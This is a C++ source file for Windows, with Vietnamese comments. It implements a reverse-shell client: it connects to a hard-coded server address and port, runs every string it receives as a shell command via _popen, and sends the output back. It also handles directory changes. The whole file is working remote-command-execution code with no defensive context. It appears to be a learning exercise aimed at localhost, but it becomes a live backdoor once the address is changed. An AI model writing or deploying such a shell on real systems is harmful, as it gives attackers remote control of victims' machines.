#include <iostream>
#include <WinSock2.h>
#include <ws2tcpip.h>
#include <array>
#include <direct.h>

#pragma comment(lib, "ws2_32.lib");  // link thu vien ws2_32.lib de su dung cac ham cua thu vien nay
using namespace std;

#define SERVER_IP "127.0.0.1"
#define SERVER_PORT "8888"

void initClientSocket(){
    WSADATA WSAData;
    int result = WSAStartup(MAKEWORD(2, 2), &WSAData);      // thu tuc khai bao init socket, version, noi luu tru gia tri cua socket - result
    if(result != 0){
        cerr << "WSAStartup error " << result << endl;
        exit(1);
    }

}

SOCKET createClientSocket(){
    struct addrinfo *result = NULL;
    struct addrinfo hints;

    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    int iResult = getaddrinfo(SERVER_IP, SERVER_PORT, &hints, &result);
    if(iResult != 0){
        cerr << "Getaddrinfo failed" << endl;
        exit(1);
    }

    SOCKET clientSocket = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
    if(clientSocket == INVALID_SOCKET){
        cerr << "Socket create failed" << endl;
        exit(1);
    }

    int connectionResult = connect(clientSocket, result->ai_addr, (int)result->ai_addrlen);
    if(connectionResult == SOCKET_ERROR){
        cerr << "Connection error" << endl;
        exit(1);
    }



    return clientSocket;
}

void receiveMessage(SOCKET clientSocket){
    char buffer[512];
    int iResult = recv(clientSocket, buffer, sizeof(buffer), 0);
    if(iResult > 0){
        buffer[iResult] = '\0';
        cout << "Server message: " << buffer << endl;
    } else if(iResult == 0) {
        cout << "Connection closed" << endl;
    } else{
        cerr << "Recv failed!" << endl;
    }
}

string executeCommand(const string &command){
    array <char, 128> buffer;
    string result;

    FILE *pipe = _popen(command.c_str(), "r");
    if(!pipe) return "Command execution failed!";

    while(fgets(buffer.data(), buffer.size(), pipe) != nullptr){
        result += buffer.data();
    }
    _pclose(pipe);

    return result;
}

void handleServerCommands(SOCKET clientSocket){
    while(true){
        char buffer[10000];
        int iResult = recv(clientSocket, buffer, sizeof(buffer) -1, 0);
        
        if(iResult > 0){
            buffer[iResult] = '\0';
            string command(buffer);

            if (command.rfind("cd", 0) == 0){
                string newDir = command.substr(3);
                if (_chdir(newDir.c_str()) == 0){
                    char currentDir[1024];
                    if(_getcwd(currentDir, sizeof(currentDir))){
                        string Message = "Directory changed to " + string(currentDir) + "\n";
                        send(clientSocket, Message.c_str(), Message.length(), 0);
                    }else{
                        send(clientSocket, "Failed to retrive directory.\n", 30, 0);
                    }
                }else{
                    send(clientSocket, "Failed to change directory.\n", 29, 0);
                }
            }else{
                string result = executeCommand(command);
                send(clientSocket, result.c_str(), result.length(), 0);
            }

            if (command == "exit") break;

        }else if(iResult == 0){
            cout << "Connection close!" << endl;
            break;

        }else {
            cerr << "Recv failed!" << endl;
            break;
        }

    }
}

int main(){
    initClientSocket();
    SOCKET clientSocket = createClientSocket();
    cout << "Connected to the server!" << endl;
    // receiveMessage(clientSocket);

    handleServerCommands(clientSocket);
    

    return 0;
}
